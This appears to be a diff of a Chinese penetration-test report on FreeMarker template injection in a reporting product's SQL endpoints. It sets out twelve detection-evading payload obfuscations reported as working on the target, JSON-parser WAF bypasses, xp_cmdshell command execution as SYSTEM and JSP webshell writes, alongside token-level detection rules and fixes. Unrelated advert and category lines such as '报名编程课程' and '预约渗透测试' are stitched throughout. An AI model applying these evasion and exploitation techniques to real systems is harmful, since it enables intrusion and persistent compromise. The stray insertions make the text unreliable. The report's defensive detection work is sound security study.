 > 需求背景：流量侧检测会锚定 `freemarker.template.utility.` 明文字符串。以下方案在本地 `TestFm.java`（与目标相同的 `freemarker-2.3.31` + `setClassicCompatible(true)`）验证后，再上线服务器实测。
->
-> 字典与百科全书
 
 ## 5.1 方案 A：字符串分段拼接
 
@@ -1288,8 +1244,6 @@ OUT: [FM-TEST-2337
 
 **流量中不包含 `freemarker` / `template` / `utility` / `Execute` 任何子串**（`al`/`au` 字母表 + `substring` 索引拼出类名）。该方案已上线服务器实测通过（4.2 节 r7.png 的 `sql2.txt` 即为其最终形态——结合 `"SpringApplicationContextHolder"?substring(0,0)` 空串技巧，连 `"freemarker.template.utility."` 常量都不出现）。
 
-数据管理
-
 ## 5.3 `?new()` 语法变体矩阵（本地 TestFm 验证）
 
 ```
@@ -1314,11 +1268,11 @@ cls?new( ) (括号内空格) => OUT: [X5
 
 结论：**除 `?New()` 大写外，所有空白/注释插入变体均可执行**（X1–X5、X7）。`?new(` 的 token 序列不可混淆（见第 6 节），但其**连续字面量**可被空白/注释拆分。
 
-计算机安全
-
 ## 5.4 混淆演变谱系（12 个变体的分层）
 
 对攻击者视角下按"FreeMarker AST 结构 + JSON 特性"演进的 12 个 payload 变体做了分层与验证。**12 个变体全部在目标服务器实测成功——均成功执行解析并生成文件**（见第 4 节报文；P9 同时对应 5.2 方案 B 的服务器实测）；其中 P10–P12 另经本地 `TestFm`（与目标同配置，`setClassicCompatible(true)`）做了 AST 级语义等价验证（命令替换为安全 echo）：
+
+评估 系统安全
 
 | 变体 | 混淆维度 | 流量中残留特征 | 验证 |
 | --- | --- | --- | --- |
@@ -1328,7 +1282,7 @@ cls?new( ) (括号内空格) => OUT: [X5
 | P4 | 前缀+类名分段：`"Exec"+"ute"`、`("前缀"+cls)?new()` | 前缀仍明文、`?new(` 明文 | 语义等价 ✅ |
 | P5 | substring 提取类名：`"Exec"?substring(0,4)+"ute"` | 前缀仍明文、`?substring` 明文 | 语义等价 ✅ |
 | P6 | 变量中转 + substring：多级 `<#assign>` | 前缀仍明文、`?substring` 明文 | 语义等价 ✅ |
-| P7 | 完整类名作 substring [数据](#)源：`src?substring(0,28)` + Execute 逐字符拼 | **完整类名明文出现**（仅作数据源）、`?new(` 明文 | 服务器实测 ✅（r9ds 形态） |
+| P7 | 完整类名作 substring 数据源：`src?substring(0,28)` + Execute 逐字符拼 | **完整类名明文出现**（仅作数据源）、`?new(` 明文 | 服务器实测 ✅（r9ds 形态） |
 | P8 | 空串技巧：`"SpringApplicationContextHolder"?substring(0,0)+"freemarker.template.utility."` | **前缀仍明文**（`freemarker.template.utility.` 常量字符串） | 服务器实测 ✅（sql2.txt，r7/r9/r9b/r12） |
 | P9 | 字母表全混淆：`al`/`au` substring 逐字符拼出全类名 | **无任何危险类名字符串**；`?new(` 明文、命令明文 | 服务器实测 ✅（5.2 方案 B 落盘验证） |
 | P10 | P9 + `?new(` 拆分：`cls ?` 换行 `<#--a-->` `<#--b-->` `new()` + 命令混淆（`cMd /cecho+1337>..`） | **`?new(` 连续字面量消失**、类名/命令特征全消失 | 服务器实测 ✅（文件生成确认；本地 AST 等价 ✅） |
@@ -1336,8 +1290,6 @@ cls?new( ) (括号内空格) => OUT: [X5
 | P12 | P11 + **全 Unicode `\uXXXX` 转义**（含 `select`、`<#`、命令、路径） | **原始报文中无任何 ASCII 明文**（连 `select` 都不出现） | 服务器实测 ✅（文件生成确认；本地 AST 等价 ✅） |
 
 混淆维度归纳：**类名 → 命令 → 语法 → 传输编码** 四层递进。P9 起字符串层特征全部失效；P10 起 `?new(` 连续字面量失效；P11 起 `${` 失效；P12 起原始字节层一切 ASCII 特征失效。
-
-C 与 C++
 
 ---
 
@@ -1360,8 +1312,6 @@ IDENT(cls)  ?  IDENT(new)  LPAREN ...
 - AST 层对应唯一的 `New` 节点 + 后续 `MethodCall`（`p(...)`）/`Dot`（`.start()`/`.waitFor()`）节点。
 
 **token 级检测实现**（词法近似，等价于剥离注释+空白归一）：
-
-编程
 
 ```
 # 预处理后匹配：\? \s* new \s* \(
@@ -1389,8 +1339,6 @@ IDENT(cls)  ?  IDENT(new)  LPAREN ...
 
 全部 12 个变体的请求体呈**高度一致的 JSON 骨架**，这是与正常业务流量的核心区分面：
 
-Java（编程语言）
-
 ```
 {"sql":"select '<#...>' as val","dbSource":"","paramArray":[],"type":"0"}
 ```
@@ -1399,7 +1347,7 @@ Java（编程语言）
 | --- | --- | --- |
 | `sql` 值形态 | 恒以 `select '` 开头，单引号内紧跟模板定界符（`<#` 或 `${`） | 正常 SQL 无模板定界符 |
 | `paramArray` | 恒为空数组 `[]` | 带参查询时非空 |
-| `dbSource` | 恒为空串 `""` | 设计器查询通常选择[数据](#)源 |
+| `dbSource` | 恒为空串 `""` | 设计器查询通常选择数据源 |
 | `type` | 恒为 `"0"` | 固定值 |
 | `\"` 转义双引号 | 模板字符串被 JSON 引号包裹，`\"` 密集出现（P1–P11） | 正常 SQL 字符串值罕见 |
 | `\\` 双反斜杠 | 写文件变体含 `..\\U8System\\Tomcat\\webapps`（P7–P12） | 正常 SQL 几乎不出现 |
@@ -1454,7 +1402,7 @@ JSON 解码后可见的模板定界符（${ 或 <#，P11 后仅剩 <#）
 
 这既是利用的必要条件，也是检测的最小充分条件。**字符串级特征（类名/命令/`?new(` 字面量/`${`）均可被 P9–P12 逐层消除，但 token 序列不可变**；P12 的 `\u` 转义只在原始字节层生效，经 JSON 解码（L2）后还原为同一 token 序列。
 
-软件实用程序
+报名编程课程
 
 ---
 
@@ -1529,8 +1477,6 @@ FastJsonHttpMessageConverter4 形同虚设
 
 （A1/A2/A3/C1–C7/M1–M5 均为无害验证 payload；`\uXXXX` 全部为 Jackson 标准转义，多 u 复写为 fastjson 私有特性——见 §6.12.5。）
 
-计算机安全
-
 ## 6.10 WAF 绕过手法（按解析器实现原理推导）与检测修正
 
 ### 6.10.1 可行的绕过面（已实证）
@@ -1545,8 +1491,6 @@ FastJsonHttpMessageConverter4 形同虚设
 ### 6.10.2 不可行的绕过面（Jackson 严格模式拦截）
 
 `\xHH`、单引号、注释、无引号 key、原始控制字符、尾逗号、键值间 `\b`/`\f`——**fastjson 私有宽松语法在请求体层全部失效**。攻击者若误用 fastjson 特性构造 payload，请求在 JSON 解析层即被 500 拒绝。**不存在"解析器宽容 → 语义分裂 → WAF 绕过"的经典缝隙**（该类缝隙要求解析器与 WAF 对同一输入给出不同判定，此处实际解析器是严格模式 Jackson，与标准 WAF 判定一致）；且连 **Content-Type 切换通道都不存在**（fastjson converter 未注册，非 JSON Content-Type 一律 `HttpMediaTypeNotSupportedException`，见 §6.11）。
-
-C 与 C++
 
 u 转义 标准 JSON
 
@@ -1604,7 +1548,7 @@ L2 解码层 token 正则命中 告警
 ### 6.11.3 新发现：paramArray 二次 fastjson 解析层（存在但不可利用）
 
 - `util.e.a(String, Map, Object)`（参数替换）内部：`JSONArray.parseArray(String.valueOf(paramArray))` → 遍历 `getJSONObject(i)` 取 `paramName`/`paramValue` 做 `${paramName}` 占位符替换——**存在一层 fastjson 宽松解析**，本可成为 `\xHH` 二次解码面（`\\x27` 双反斜杠过 Jackson 层，二次解析解码为 `'`）；
-- 但二次解析的输入是 **Jackson 解析结果的 [Java](#) `toString` 格式**，与纯 fastjson 环境（JSONArray.toString = JSON 格式）完全不同：
+- 但二次解析的输入是 **Jackson 解析结果的 Java `toString` 格式**，与纯 fastjson 环境（JSONArray.toString = JSON 格式）完全不同：
 
 | paramArray 形态 | Jackson 解析结果 | Java toString | 二次解析结果 | 实测 |
 | --- | --- | --- | --- | --- |
@@ -1634,11 +1578,11 @@ L2 解码层 token 正则命中 告警
 | `AllowSingleQuote` 单引号 key | ❌ | A1 实测（已有） |
 | @type 值首引号可替换为任意字符 | ❌ | N1 实测：`"sql":xselect` → 500（Jackson 值位置严格，无此逻辑漏洞） |
 | `\u`/`\x` 混合编码 | ⚠️ 部分适用 | `\u` ✅（A3/C7/P12）；`\x` ❌（A2）——**与文章"两者皆可"不同** |
-| smartMatch：key 中 `_`/`-` 被忽略（fnv1a\_64\_lower） | ❌ 天然不适用 | 无 [Java](#)Bean 反序列化：请求体层 Jackson Map 精确匹配、二次层 `JSONObject.get()` 精确匹配 |
+| smartMatch：key 中 `_`/`-` 被忽略（fnv1a\_64\_lower） | ❌ 天然不适用 | 无 JavaBean 反序列化：请求体层 Jackson Map 精确匹配、二次层 `JSONObject.get()` 精确匹配 |
 | 1.2.36+ 属性 `is` 前缀剥离 | ❌ 天然不适用 | 同上（纯 JavaBeanDeserializer 特性） |
 | `/**/`/`//` 注释打乱特征 | ❌ | C1/N3 实测：注释 → JsonParseException |
 | 注释+控制字符 `\u001a` 语义分裂（WAF 删注释失败） | ❌ 不适用 | N3 实测：Jackson 词法层拒绝 `/`；解析器比 WAF 严格，无"WAF 清洗后仍可执行"缝隙 |
-| **JSON [数据](#)后填充任意字符** | ✅✅ **完全适用且更强** | N2 族 12 变体全执行：fastjson 排除 `():[]{}`，Jackson 2.9 **无任何排除** |
+| **JSON 数据后填充任意字符** | ✅✅ **完全适用且更强** | N2 族 12 变体全执行：fastjson 排除 `():[]{}`，Jackson 2.9 **无任何排除** |
 
 ### 6.12.2 重大迁移发现：Jackson 2.9 尾随杂散字符（N2 族，威胁检测模型）
 
@@ -1661,7 +1605,7 @@ L2 解码层 token 正则命中 告警
 ### 6.12.4 结论与检测模型二次修正
 
 - 文章 11 项手法仅 1 项完全迁移（尾随杂散字符 N2 族），且**当前环境比文章描述的 fastjson 行为更强**（无 `():[]{}` 排除）——这是 Jackson 2.9 旧版（无 EOF 校验）特有的攻击面；
-- 其余 10 项在请求体层全部被 Jackson 严格模式拒绝，或属 fastjson [Java](#)Bean 特性在当前环境天然不存在；
+- 其余 10 项在请求体层全部被 Jackson 严格模式拒绝，或属 fastjson JavaBean 特性在当前环境天然不存在；
 - §6.5 检测模型**二次修正**：L1 密度检测与 L2 解码检测的作用域**必须限定在 JSON 结构内**（`{`…`}`），全文统计可被 N2 尾随填充稀释绕过；WAF 侧禁止以"JSON 完整性校验失败"为由放行——应用解析器（Jackson 2.9 宽松尾随）与严格校验器语义分裂正是 N2 攻击的入口。
 
 ### 6.12.5 补充验证：多 u 复写 `\uuuuXXXX`（fastjson 私有转义特性）
@@ -1785,15 +1729,15 @@ ObjectConstructor 可构造 ProcessBuilder
 | A1 | `queryFieldBySql` sql 参数 SSTI | 无 | 命令执行 | ✅ 实证 |
 | A2 | `loadTableData` sql 参数 SSTI + call 前缀存储过程通道 | 无 | 命令执行（freemarker SSTI）；**任意存储过程执行 + 输出回显（`call xp_cmdshell('whoami')` → `nt authority\system`，SYSTEM 权限，目标实测）** | ✅ 实证（2.5.3 C） |
 | A3 | `saveDb` 无鉴权写 dbDynSql | 无 | 持久化恶意模板 | ✅ 实证 |
-| A4 | `save` 无鉴权更新报表 | 无 | 绑定恶意[数据](#)集到报表 | ✅ 实证 |
+| A4 | `save` 无鉴权更新报表 | 无 | 绑定恶意数据集到报表 | ✅ 实证 |
 | A5 | `show` 渲染持久化模板 | 需 A3+A4 | 命令执行 | ✅ 实证 |
 | A6 | `exportAllExcel` 渲染持久化模板 | 需 A3+A4 | 命令执行 | ✅ 实证 |
 | A7 | `exportPdf` 渲染持久化模板 | 需 A3+A4 | 命令执行 | ✅ 实证 |
 | A8 | `testConnection` 无鉴权 JDBC 任意连接 | 无 | **SSRF / 内网端口探测（异常回显）/ H2 远程 SQL 脚本执行（INIT）/ 任意路径文件写（H2 file 模式，父目录自动创建）/ RCE 链（INIT 脚本内 CREATE ALIAS 编译 + CALL）** | ✅ 实证（2.6） |
 | A9 | `paramArray[].paramValue` Aviator 表达式 + 零过滤 SQL 注入 | 无 | Aviator 表达式求值注入（任意算术/内置函数，无命令执行，能力边界已实测 2.5.2）；**零过滤 SQL 注入通道：绕过过滤独立注入、union 字段名/数据回显、读 sysobjects 表名（目标实测 2.5.3 B）** | ✅ 实证（2.5） |
-| A10 | `queryFieldByBean` [java](#)bean 反射面 | 需实现 IDataSetFactory 的类在类路径 | 潜在（未发现可利用类） | ⚪ 排除 |
+| A10 | `queryFieldByBean` javabean 反射面 | 需实现 IDataSetFactory 的类在类路径 | 潜在（未发现可利用类） | ⚪ 排除 |
 | A11 | `getReportByUser` / `list` / `get/{id}` 元数据接口 | 无 | 报表与数据结构信息泄露 | ⚪ 信息面 |
-| A12 | `testConnection` → [Java](#) 写文件通道 → 任意后缀落盘（JSP） | 无 | **写入可执行 JSP 至 webapps（内容任意、Tomcat 即时编译执行）/ WEB-INF 目录可写 → WebShell 持久化** | ✅ 实证（2.6.3 #10–#12） |
+| A12 | `testConnection` → Java 写文件通道 → 任意后缀落盘（JSP） | 无 | **写入可执行 JSP 至 webapps（内容任意、Tomcat 即时编译执行）/ WEB-INF 目录可写 → WebShell 持久化** | ✅ 实证（2.6.3 #10–#12） |
 
 ## 8.2 修复建议（按优先级）
 
@@ -1808,7 +1752,9 @@ ObjectConstructor 可构造 ProcessBuilder
 
 测试在目标上遗留了以下痕迹，环境重置时应清除：
 
-- 报表 `1245588124302835712`（含 r9ds / r10ds / r11ds 三个[数据](#)集记录）；
+报名编程课程
+
+- 报表 `1245588124302835712`（含 r9ds / r10ds / r11ds 三个数据集记录）；
 - 垃圾报表（`{"id":""}` 调用产生的 `jsonStr=null` 记录）；
 - 文件：`webapps/r7.png`、`r9.png`、`r9b.png`、`r12.png`（内容均为 `1337` 文本），以及早期尝试遗留的 `shell1.jsp`（位于 AppServer 目录，Web 不可达）等。
 
@@ -1843,6 +1789,8 @@ java -cp .:$FM TestFm '<模板字符串>'
 ```
 
 用途：在构造 payload 前先在本地确认模板可执行、混淆方案有效、语法变体兼容性，再上线服务器实测（避免无效流量）。
+
+预约渗透测试
 
 ---
 
